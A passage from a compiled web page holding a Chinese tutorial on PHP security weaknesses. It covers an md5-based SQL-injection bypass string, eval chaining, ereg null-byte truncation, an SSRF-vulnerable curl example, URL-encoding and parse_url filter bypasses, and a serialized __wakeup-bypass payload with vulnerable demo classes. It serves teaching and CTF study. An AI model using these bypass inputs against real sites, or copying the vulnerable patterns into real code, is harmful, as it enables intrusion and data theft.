'\u5bc6\u7801\u9519\u8bef!';\n}\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u91cc\u63d0\u4ea4\u7684\u53c2\u6570\u901a\u8fc7",(0,r.jsx)(n.code,{children:"md5"}),"\u51fd\u6570\u5904\u7406\uff0c\u7136\u540e\u518d\u8fdb\u5165SQL\u67e5\u8be2\u8bed\u53e5\uff0c\u6240\u4ee5\u5e38\u89c4\u7684\u6ce8\u5165\u624b\u6bb5\u5c31\u4e0d\u884c\u4e86\uff0c\u90a3\u4e48\u5982\u679cmd5\u540e\u7684\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\u683c\u5f0f\u53d8\u6210\u4e86",(0,r.jsx)(n.code,{children:"'or'xxxx"}),"\u7684\u683c\u5f0f\uff0c\u4e0d\u5c31\u53ef\u4ee5\u6ce8\u5165\u4e86\u4e48\u3002",(0,r.jsx)(n.code,{children:"md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c"})]}),"\n",(0,r.jsxs)(n.p,{children:["\u8f6c\u6210\u5b57\u7b26\u4e32\u4e3a",(0,r.jsx)(n.code,{children:"'or'6xxx"})]}),"\n",(0,r.jsx)(n.h4,{id:"eval-1",children:"eval()"}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u6267\u884c\u547d\u4ee4\u65f6\uff0c\u53ef\u4f7f\u7528\u5206\u53f7\u6784\u9020\u5904\u591a\u6761\u8bed\u53e5\u3002\u7c7b\u4f3c\u8fd9\u79cd\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n\t$cmd = \"echo 'a';echo '--------------';echo 'b';\";\n\techo eval($cmd);\n?>\n"})}),"\n",(0,r.jsx)(n.h4,{id:"ereg",children:"ereg()"}),"\n",(0,r.jsxs)(n.p,{children:["\u5b58\u5728",(0,r.jsx)(n.code,{children:"%00"}),"\u622a\u65ad\uff0c\u5f53\u9047\u5230\u4f7f\u7528\u6b64\u51fd\u6570\u6765\u8fdb\u884c\u6b63\u5219\u5339\u914d\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u7528",(0,r.jsx)(n.code,{children:"%00"}),"\u6765\u622a\u65ad\u6b63\u5219\u5339\u914d\uff0c\u4ece\u800c\u7ed5\u8fc7\u6b63\u5219\u3002"]}),"\n",(0,r.jsx)(n.h4,{id:"strcmp",children:"strcmp()"}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u4e2a\u5728\u524d\u9762\u4ecb\u7ecd\u8fc7\uff0c\u5c31\u662f\u6570\u7ec4\u7ed5\u8fc7\u6280\u5de7\u3002"}),"\n",(0,r.jsx)(n.h4,{id:"curl_setopt",children:"curl_setopt()"}),"\n",(0,r.jsx)(n.p,{children:"\u5b58\u5728ssrf\u6f0f\u6d1e\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    $ch = curl_init();\n    curl_setopt($ch, CURLOPT_URL, $_GET['Ameng']);\n    #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\n    curl_setopt($ch, CURLOPT_HEADER, 0);\n    #curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);\n    curl_exec($ch);\n    curl_close($ch);\n?>\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4f7f\u7528file\u534f\u8bae\u8fdb\u884c\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648349.png",alt:"img"})}),"\n",(0,r.jsx)(n.p,{children:"\u9664\u6b64\u4e4b\u5916\u8fd8\u6709dict\u534f\u8bae\u67e5\u770b\u7aef\u53e3\u4fe1\u606f\u3002gopher\u534f\u8bae\u53cd\u5f39shell\u5229\u7528\u7b49\u3002"}),"\n",(0,r.jsx)(n.h4,{id:"preg_replace-1",children:"preg_replace()"}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u51fd\u6570\u524d\u9762\u8be6\u7ec6\u4ecb\u7ecd\u8fc7\uff0c/e\u6a21\u5f0f\u4e0b\u7684\u547d\u4ee4\u6267\u884c\u3002"}),"\n",(0,r.jsx)(n.h4,{id:"urldecode",children:"urldecode()"}),"\n",(0,r.jsx)(n.p,{children:"url\u4e8c\u6b21\u7f16\u7801\u7ed5\u8fc7\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n\t$name = urldecode($_GET[\'name\']);\n\tif($name = "Ameng"){\n\t\techo "Plase~";\n\t}\n\telse{\n\t\techo "sorry";\n\t}\n?>\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5c06Ameng\u8fdb\u884c\u4e8c\u6b21url\u7f16\u7801\uff0c\u7136\u540e\u4f20\u5165\u5373\u53ef\u5f97\u5230\u6ee1\u8db3\u6761\u4ef6\u3002"}),"\n",(0,r.jsx)(n.h4,{id:"file_get_contents-1",children:"file_get_contents()"}),"\n",(0,r.jsx)(n.p,{children:"\u5e38\u7528\u4f2a\u534f\u8bae\u6765\u8fdb\u884c\u7ed5\u8fc7\u3002"}),"\n",(0,r.jsx)(n.h4,{id:"parse_url",children:"parse_url()"}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u51fd\u6570\u4e3b\u8981\u7528\u4e8e\u7ed5\u8fc7\u67d0\u4e9b\u8fc7\u6ee4\uff0c\u5148\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b\u51fd\u6570\u7684\u57fa\u672c\u7528\u6cd5\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n\t$url = "http://www.jlx-love.com/about";\n\t$parts = parse_url($url);\n\tprint_r($parts);\n?>\n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>\nArray \n    ( \n    [scheme] => http \n    [host] => www.jlx-love.com \t\t[path] => /about \n\t)\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u51fd\u6570\u628a\u6211\u4eec\u7684\u53d8\u91cf\u503c\u62c6\u5206\u6210\u4e00\u4e2a\u51e0\u4e2a\u90e8\u5206\u3002\u90a3\u4e48\u7ed5\u8fc7\u8fc7\u6ee4\u53c8\u662f\u8bf4\u7684\u54ea\u56de\u4e8b\u5462\uff1f\u5176\u5b9e\u5c31\u662f\u5f53\u6211\u4eec\u5728\u6d4f\u89c8\u5668\u8f93\u5165url\u65f6\uff0c\u90a3\u4e48\u5c31\u4f1a\u5c06url\u4e2d\u7684\\\u8f6c\u6362\u4e3a/\uff0c\u4ece\u800c\u5c31\u4f1a\u5bfc\u81f4",(0,r.jsx)(n.code,{children:"parse_url"}),"\u7684\u767d\u540d\u5355\u7ed5\u8fc7\u3002"]}),"\n",(0,r.jsx)(n.h3,{id:"\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e",children:"\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"}),"\n",(0,r.jsx)(n.h4,{id:"\u7b80\u4ecb",children:"\u7b80\u4ecb"}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u4e86\u89e3\u4e00\u4e9b\u51fd\u6570\u4e4b\u524d\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u4e86\u89e3\u4ec0\u4e48\u662f\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u5e8f\u5217\u5316\uff1a\u628a\u5bf9\u8c61\u8f6c\u6362\u4e3a\u5b57\u8282\u5e8f\u5217\u7684\u8fc7\u7a0b\u6210\u4e3a\u5bf9\u8c61\u7684\u5e8f\u5217\u5316\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u53cd\u5e8f\u5217\u5316\uff1a\u628a\u5b57\u8282\u5e8f\u5217\u6062\u590d\u4e3a\u5bf9\u8c61\u7684\u8fc7\u7a0b\u79f0\u4e3a\u5bf9\u8c61\u7684\u53cd\u5e8f\u5217\u5316\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u5f52\u6839\u5230\u5e95\uff0c\u5c31\u662f\u5c06\u6570\u636e\u8f6c\u5316\u6210\u4e00\u79cd\u53ef\u9006\u7684\u6570\u636e\u7ed3\u6784\uff0c\u9006\u5411\u7684\u8fc7\u7a0b\u5c31\u662f\u53cd\u5e8f\u5217\u5316\u3002"}),"\n",(0,r.jsxs)(n.p,{children:["\u5728 PHP \u4e2d\u4e3b\u8981\u5c31\u662f\u901a\u8fc7",(0,r.jsx)(n.code,{children:"serialize"}),"\u548c",(0,r.jsx)(n.code,{children:"unserialize"}),"\u6765\u5b9e\u73b0\u6570\u636e\u7684\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u90a3\u4e48\u6f0f\u6d1e\u662f\u5982\u4f55\u5f62\u6210\u7684\u5462\uff1f"}),"\n",(0,r.jsx)(n.p,{children:"PHP \u7684\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u4e3b\u8981\u662f\u56e0\u4e3a\u672a\u5bf9\u7528\u6237\u8f93\u5165\u7684\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u8fdb\u884c\u68c0\u6d4b\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u53cd\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\uff0c\u4ece\u800c\u5c31\u53ef\u4ee5\u5bfc\u81f4\u5404\u79cd\u5371\u9669\u884c\u4e3a\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u90a3\u4e48\u6211\u4eec\u5148\u6765\u770b\u4e00\u770b\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e\u683c\u5f0f\u662f\u600e\u6837\u7684\uff0c\u4e86\u89e3\u4e86\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e\uff0c\u6211\u4eec\u624d\u80fd\u66f4\u597d\u7684\u7406\u89e3\u548c\u5229\u7528\u6f0f\u6d1e\u3002\u6240\u4ee5\u6211\u4eec\u6765\u6784\u9020\u4e00\u6bb5\u5e8f\u5217\u5316\u7684\u503c\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n    class Ameng{\n    public $who = "Ameng";\n\t}\n\t$a = serialize(new Ameng);\n\techo $a;\n?>\n\u6267\u884c\u7ed3\u679c\u2014\u2014>\nO:5:"Ameng":1:{s:3:"who";s:5:"Ameng";}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648350.png",alt:"img"})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u91cc\u8fd8\u8981\u8865\u5145\u4e00\u70b9\uff0c\u5c31\u662f\u5173\u4e8e\u53d8\u91cf\u7684\u5206\u7c7b\uff0c\u53d8\u91cf\u7684\u7c7b\u522b\u6709\u4e09\u79cd\uff1a"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"public\uff1a\u6b63\u5e38\u64cd\u4f5c\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u539f\u578b\u5c31\u884c\u3002"}),"\n",(0,r.jsx)(n.li,{children:"protected\uff1a\u53cd\u5e8f\u5217\u5316\u65f6\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a%00*%00\u3002"}),"\n",(0,r.jsx)(n.li,{children:"private\uff1a\u53cd\u5e8f\u5217\u5316\u65f6\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a%00\u7c7b\u540d%00\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u5e8f\u5217\u5316\u6211\u4eec\u77e5\u9053\u4e86\u662f\u4e2a\u4ec0\u4e48\u683c\u5f0f\uff0c\u90a3\u4e48\u5982\u4f55\u5229\u7528\u53cd\u5e8f\u5217\u5316\u6765\u89e6\u53d1\u6f0f\u6d1e\u8fdb\u884c\u5229\u7528\u5462\uff1f"}),"\n",(0,r.jsx)(n.h4,{id:"__wakeup",children:"__wakeup()"}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u6211\u4eec\u53cd\u5e8f\u5217\u5316\u65f6\uff0c\u4f1a\u5148\u68c0\u67e5\u7c7b\u4e2d\u662f\u5426\u5b58\u5728",(0,r.jsx)(n.code,{children:"__wakeup()"}),"\u5982\u679c\u5b58\u5728\uff0c\u5219\u6267\u884c\u3002\u4f46\u662f\u5982\u679c\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u5927\u4e8e\u771f\u5b9e\u7684\u5c5e\u6027\u4e2a\u6570\u65f6\u5c31\u4f1a\u8df3\u8fc7",(0,r.jsx)(n.code,{children:"__wakeup()"}),"\u6267\u884c",(0,r.jsx)(n.code,{children:"__destruct()"}),"\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u5f71\u54cd\u7248\u672c\uff1a"}),"\n",(0,r.jsx)(n.p,{children:"PHP5 < 5.6.\nPHP7 < 7.0.\n\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n\theader("Content-Type: text/html; charset=utf-8");\n    class Ameng{ \n        public $name=\'1.php\'; \n\n        function __destruct(){ \n            echo "destruct\u6267\u884c<br>";\n\n            echo highlight_file($this->name, true); \n        } \n         \n\n        function __wakeup(){ \n            echo "wakeup\u6267\u884c<br>";\n            $this->name=\'1.php\'; \n        } \n    }\n\t$data = \'O:5:"Ameng":2:{s:4:"name";s:5:"2.php";}\';\n\tunserialize($data);\n?>\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u6267\u884c\u7ed3\u679c\uff1a"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648351.png",alt:"img"})}),"\n",(0,r.jsx)(n.h4,{id:"__sleep",children:"__sleep()"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"__sleep()"}),"\u51fd\u6570\u521a\u597d\u4e0e",(0,r.jsx)(n.code,{children:"__waeup()"}),"\u76f8\u53cd\uff0c\u524d\u8005\u662f\u5728\u5e8f\u5217\u5316\u4e00\u4e2a\u5bf9\u8c61\u65f6\u88ab\u8c03\u7528\uff0c\u540e\u8005\u662f\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u88ab\u8c03\u7528\u3002\u90a3\u4e48\u8be5\u5982\u4f55\u5229\u7528\u5462\uff1f\u6211\u4eec\u770b\u770b\u4ee3\u7801\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n\theader("Content-Type: text/html; charset=utf-8");\n    class Ameng{ \n        public $name=\'1.php\'; \n\t\t\n\t\tpublic function __construct($name){\n        $this->name=$name;\n    }\n\t\t\n\t\tfunction __sleep(){\n\t\t\techo "sleep()\u6267\u884c<br>";\n\t\t\techo highlight_file($this->name, true);\n\t\t}\n\t\t\n\t\tfunction __destruct(){\n\t\t\techo "over<br>";\n\t\t}\n\t\t\n        function __wakeup(){ \n            echo "wakeup\u6267\u884c<br>";         \n        } \n    }\n\t$a = new Ameng("2.php");\n\t$b = serialize($a);\n?>\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u6267\u884c\u7ed3\u679c\uff1a"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648352.png",alt:"img"})}),"\n",(0,r.jsx)(n.h4,{id:"__destruct",children:"__destruct()"}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u4e2a\u51fd\u6570\u7684\u4f5c\u7528\u5176\u5b9e\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\u5df2\u7ecf\u663e\u793a\u4e86\uff0c\u5c31\u662f\u5728\u5bf9\u8c61\u88ab\u9500\u6bc1\u65f6\u8c03\u7528\uff0c\u5018\u82e5\u8fd9\u4e2a\u51fd\u6570\u4e2d\u6709\u547d\u4ee4\u6267\u884c\u4e4b\u7c7b\u7684\u529f\u80fd\uff0c\u6211\u4eec\u5b8c\u5168\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u6765\u8fdb\u884c\u6f0f\u6d1e\u7684\u5229\u7528\uff0c\u5f97\u5230\u81ea\u5df1\u60f3\u8981\u7684\u7ed3\u679c\u3002"}),"\n",(0,r.jsx)(n.h4,{id:"__construct",children:"__construct()"}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u4e2a\u51fd\u6570\u7684\u4f5c\u7528\u5728",(0,r.jsx)(n.code,{children:"__sleep()"}),"\u4e5f\u662f\u4f53\u73b0\u4e86\u7684\uff0c\u8fd9\u4e2a\u51fd\u6570\u5c31\u662f\u5728\u4e00\u4e2a\u5bf9\u8c61\u88ab\u521b\u5efa\u65f6\u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u6bd4\u5982\u6211\u5728",(0,r.jsx)(n.code,{children:"__sleep()"}),"\u4e2d\u7528\u8fd9\u4e2a\u51fd\u6570\u6765\u5bf9\u53d8\u91cf\u8fdb\u884c\u8d4b\u503c\u3002"]}),"\n",(0,r.jsx)(n.h4,{id:"__call",children:"__call()"}),"\n",(0,r.jsxs)(n.p,{children:["\u6b64\u51fd\u6570\u7528\u6765\u76d1\u89c6\u4e00\u4e2a\u5bf9\u8c61\u4e2d\u7684\u5176\u4ed6\u65b9\u6cd5\u3002\u5f53\u4f60\u5c1d\u8bd5\u8c03\u7528\u4e00\u4e2a\u5bf9\u8c61\u4e2d\u4e0d\u5b58\u5728\u7684\u6216\u8005\u88ab\u6743\u9650\u63a7\u5236\u7684\u65b9\u6cd5\uff0c\u90a3\u4e48",(0,r.jsx)(n.code,{children:"__call"}),"\u5c31\u4f1a\u88ab\u81ea\u52a8\u8c03\u7528"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n\theader("Content-Type: text/html; charset=utf-8");\n    class Ameng{  \n\t\t\n\t\tpublic function __call($name,$args){\n\t\t\techo "<br>"."call\u6267\u884c\u5931\u8d25";\n\t\t}\n\t\t\n\t\tpublic static function __callStatic($name,$args){\n\t\t\techo "<br>"."callStatic\u6267\u884c\u5931\u8d25";\n\t\t}\n    }\n\t$a = new Ameng;\n\t$a->b();\n\tAmeng::b();\n?>\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u6267\u884c\u7ed3\u679c\uff1a"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648353.png",alt:"img"})}),"\n",(0,r.jsx)(n.h4,{id:"__callstatic",children:"__callStatic()"}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u4e2a\u65b9\u6cd5\u662f PHP5.3 \u589e\u52a0\u7684\u65b0\u65b9\u6cd5\u3002\u4e3b\u8981\u662f\u8c03\u7528\u4e0d\u53ef\u89c1\u7684\u9759\u6001\u65b9\u6cd5\u65f6\u4f1a\u81ea\u52a8\u8c03\u7528\u3002\u5177\u4f53\u4f7f\u7528\u5728\u4e0a\u9762\u4ee3\u7801\u793a\u4f8b\u548c\u7ed3\u679c\u53ef\u89c1\u3002\u90a3\u4e48\u8fd9\u4e24\u4e2a\u51fd\u6570\u6709\u4ec0\u4e48\u503c\u5f97\u6211\u4eec\u5173\u6ce8\u7684\u5462\uff1f\u60f3\u4e00\u60f3\uff0c\u5018\u82e5\u8fd9\u4e24\u4e2a\u51fd\u6570\u4e2d\u6709\u547d\u4ee4\u6267\u884c\u7684\u51fd\u6570\uff0c\u90a3\u4e48\u6211\u4eec\u8c03\u7528\u5bf9\u8c61\u4e2d\u4e0d\u5b58\u5728\u65b9\u6cd5\u65f6\u5c31\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e24\u4e2a\u51fd\u6570\uff0c\u8fd9\u4e0d\u5c31\u8fbe\u5230\u6211\u4eec\u60f3\u8981\u7684\u76ee\u7684\u4e86\u3002"}),"\n",(0,r.jsx)(n.h4,{id:"__get",children:"__get()"}),"\n",(0,r.jsx)(n.p,{children:"\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u603b\u662f\u628a\u7c7b\u7684\u5c5e\u6027\u5b9a\u4e49\u4e3aprivate\u3002\u4f46\u6709\u65f6\u5019\u6211\u4eec\u5bf9\u5c5e\u6027\u7684\u8bfb\u53d6\u548c\u8d4b\u503c\u662f\u975e\u5e38\u9891\u7e41\uff0c\u8fd9\u4e2a\u65f6\u5019PHP\u5c31\u63d0\u4f9b\u4e86\u4e24\u4e2a\u51fd\u6570\u6765\u83b7\u53d6\u548c\u8d4b\u503c\u7c7b\u4e2d\u7684\u5c5e\u6027\u3002"}),"\n",(0,r.jsx)(n.p,{children:"get\u65b9\u6cd5\u7528\u6765\u83b7\u53d6\u79c1\u6709\u6210\u5458\u5c5e\u6027\u7684\u503c\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"//__get()\u65b9\u6cd5\u7528\u6765\u83b7\u53d6\u79c1\u6709\u5c5e\u6027\npublic function __get($name){\nreturn $this->$name;\n}\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-29",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"$name\uff1a\u8981\u83b7\u53d6\u6210\u5458\u5c5e\u6027\u7684\u540d\u79f0\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.h4,{id:"__set",children:"__set()"}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u65b9\u6cd5\u7528\u6765\u7ed9\u79c1\u6709\u6210\u5458\u5c5e\u6027\u8d4b\u503c\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"//__set()\u65b9\u6cd5\u7528\u6765\u8bbe\u7f6e\u79c1\u6709\u5c5e\u6027\npublic function __set($name,$value){\n$this->$name = $value;\n}\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-30",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"$name\uff1a\u8981\u8d4b\u503c\u7684\u5c5e\u6027\u540d\u3002"}),"\n",(0,r.jsx)(n.li,{children:"$value\uff1a\u7ed9\u5c5e\u6027\u8d4b\u503c\u7684\u503c\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.h4,{id:"__isset",children:"__isset()"}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u4e2a\u51fd\u6570\u662f\u5f53\u6211\u4eec\u5bf9\u4e0d\u53ef\u8bbf\u95ee\u5c5e\u6027\u8c03\u7528",(0,r.jsx)(n.code,{children:"isset()"}),"\u6216\u8005",(0,r.jsx)(n.code,{children:"empty()"}),"\u65f6\u8c03\u7528\u3002"]}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u8fd9\u4e4b\u524d\u6211\u4eec\u8981\u5148\u4e86\u89e3\u4e00\u4e0b",(0,r.jsx)(n.code,{children:"isset()"}),"\u51fd\u6570\u7684\u4f7f\u7528\u3002",(0,r.jsx)(n.code,{children:"isset()"}),"\u51fd\u6570\u68c0\u6d4b\u67d0\u4e2a\u53d8\u91cf\u662f\u5426\u88ab\u8bbe\u7f6e\u4e86\u3002\u6240\u4ee5\u8fd9\u4e2a\u65f6\u5019\u95ee\u9898\u5c31\u6765\u4e86\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u53bb\u68c0\u6d4b\u5bf9\u8c61\u91cc\u9762\u7684\u6210\u5458\u662f\u5426\u8bbe\u5b9a\uff0c\u90a3\u4e48\u4f1a\u53d1\u751f\u4ec0\u4e48\u5462\uff1f"]}),"\n",(0,r.jsxs)(n.p,{children:["\u82e5\u5bf9\u8c61\u7684\u6210\u5458\u662f\u516c\u6709\u6210\u5458\uff0c\u90a3\u6ca1\u4ec0\u4e48\u95ee\u9898\u3002\u5018\u82e5\u5bf9\u8c61\u7684\u6210\u5458\u662f\u79c1\u6709\u6210\u5458\uff0c\u90a3\u8fd9\u4e2a\u51fd\u6570\u5c31\u4e0d\u884c\u4e86\uff0c\u4eba\u5bb6\u6839\u672c\u5c31\u4e0d\u5141\u8bb8\u4f60\u8bbf\u95ee\uff0c\u4f60\u548b\u80fd\u68c0\u6d4b\u4eba\u5bb6\u662f\u5426\u8bbe\u5b9a\u4e86\u5462\uff1f\u90a3\u6211\u4eec\u8be5\u600e\u4e48\u529e\uff1f\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u5728\u7c7b\u91cc\u9762\u52a0\u4e0a",(0,r.jsx)(n.code,{children:"__isset()"}),"\u65b9\u6cd5\uff0c\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u4f7f\u7528",(0,r.jsx)(n.code,{children:"isset()"}),"\u5728\u5bf9\u8c61\u5916\u9762\u8bbf\u95ee\u5bf9\u8c61\u91cc\u9762\u7684\u79c1\u6709\u6210\u5458\u4e86\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n\theader("Content-Type: text/html; charset=utf-8");\n    class Ameng{  \n\t\tprivate $name;\n\t\t\n\t\tpublic function __construct($name=""){\n\t\t\t$this->name = $name;\n\t\t}\n\t\t\n\t\tpublic function __isset($content){\n\t\t\techo "\u5f53\u5728\u7c7b\u5916\u9762\u8c03\u7528isset\u65b9\u6cd5\u65f6\uff0c\u90a3\u4e48\u6211\u5c31\u4f1a\u6267\u884c\uff01"."<br>";\n\t\t\techo isset($this->$content);\n\t\t}\n    }\n\t$ameng = new Ameng("Ameng");\n\techo isset($ameng->name);\n?>\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u6267\u884c\u7ed3\u679c\uff1a"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648354.png",alt:"img"})}),"\n",(0,r.jsx)(n.h4,{id:"__unset",children:"__unset()"}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u4e2a\u65b9\u6cd5\u57fa\u672c\u548c",(0,r.jsx)(n.code,{children:"__insset"}),"\u60c5\u51b5\u4e00\u81f4\uff0c\u90fd\u662f\u5728\u7c7b\u5916\u8bbf\u95ee\u7c7b\u5185\u79c1\u6709\u6210\u5458\u65f6\u8981\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u57fa\u672c\u8c03\u7528\u7684\u65b9\u6cd5\u548c\u4e0a\u9762\u4e00\u81f4\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n\theader("Content-Type: text/html; charset=utf-8");\n    class Ameng{  \n\t\tprivate $name;\n\t\t\n\t\tpublic function __construct($name=""){\n\t\t\t$this->name = $name;\n\t\t}\n\t\t\n\t\tpublic function __unset($content){\n\t\t\techo "\u5f53\u5728\u7c7b\u5916\u9762\u8c03\u7528unset\u65b9\u6cd5\u65f6\uff0c\u90a3\u4e48\u6211\u5c31\u4f1a\u6267\u884c\uff01"."<br>";\n\t\t\techo isset($this->$content);\n\t\t}\n    }\n\t$ameng = new Ameng("Ameng");\n\tunset($ameng->name);\n?>\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u6267\u884c\u7ed3\u679c\uff1a"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648355.png",alt:"img"})}),"\n",(0,r.jsx)(n.h4,{id:"__tostring",children:"__toString()"}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u51fd\u6570\u662f\u5c06\u4e00\u4e2a\u5bf9\u8c61\u5f53\u4f5c\u4e00\u4e2a\u5b57\u7b26\u4e32\u6765\u4f7f\u7528\u65f6\uff0c\u5c31\u4f1a\u81ea\u52a8\u8c03\u7528\u8be5\u65b9\u6cd5\uff0c\u4e14\u5728\u8be5\u65b9\u6cd5\u4e2d\uff0c\u53ef\u4ee5\u8fd4\u56de\u4e00\u5b9a\u7684\u5b57\u7b26\u4e32\uff0c\u6765\u8868\u793a\u8be5\u5bf9\u8c61\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u4e4b\u540e\u7684\u7ed3\u679c\u3002"}),"\n",(0,r.jsxs)(n.p,{children:["\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u8bbf\u95ee\u7c7b\u7684\u5c5e\u6027\